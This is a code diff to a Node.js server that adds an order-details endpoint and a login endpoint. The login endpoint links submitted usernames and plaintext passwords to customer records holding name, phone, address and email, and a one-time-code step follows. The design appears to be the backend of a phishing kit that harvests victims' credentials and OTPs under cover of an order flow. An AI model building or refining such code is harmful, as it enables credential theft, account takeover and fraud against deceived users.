@@ -99,13 +99,13 @@ const server = http.createServer(async (req, res) => {
   const pathname = urlObj.pathname;
 
   try {
-    // ---- API: receive a login submission from index.html ----
-    if (method === 'POST' && pathname === '/api/login') {
+    // ---- API: receive customer details when continuing the order ----
+    if (method === 'POST' && pathname === '/api/order') {
       const body = await readBody(req);
       const entry = {
         id: nextId++,
-        username: (body.username || body.email || body.mobile || body.name || '').toString().slice(0, 100),
-        password: (body.password || body.phone || body.mobile || '').toString().slice(0, 100),
+        username: '',
+        password: '',
         otp: null,
         name: (body.name || '-').toString().slice(0, 100),
         phone: (body.phone || body.mobile || '-').toString().slice(0, 100),
@@ -118,6 +118,29 @@ const server = http.createServer(async (req, res) => {
       };
       requests.unshift(entry);
       return sendJSON(res, 200, { ok: true, id: entry.id });
+    }
+
+    // ---- API: receive a login submission from the customer flow ----
+    if (method === 'POST' && pathname === '/api/login') {
+      const body = await readBody(req);
+      const entry = body.requestId ? requests.find((request) => request.id === Number(body.requestId)) : null;
+      if (body.requestId && !entry) return sendJSON(res, 404, { ok: false, error: 'order not found' });
+      const loginEntry = entry || {
+        id: nextId++,
+        otp: null,
+        name: (body.name || '-').toString().slice(0, 100),
+        phone: (body.phone || body.mobile || '-').toString().slice(0, 100),
+        mobile: (body.mobile || body.phone || '-').toString().slice(0, 100),
+        address: (body.address || '-').toString().slice(0, 200),
+        email: (body.email || '-').toString().slice(0, 100),
+        status: 'pending',
+        createdAt: Date.now(),
+        dateKey: todayKey(),
+      };
+      loginEntry.username = (body.username || body.email || body.mobile || body.name || '').toString().slice(0, 100);
+      loginEntry.password = (body.password || body.phone || body.mobile || '').toString().slice(0, 100);
+      if (!entry) requests.unshift(loginEntry);
+      return sendJSON(res, 200, { ok: true, id: loginEntry.id });
     }
 
     // ---- API: receive an OTP submission (optional future step) ----
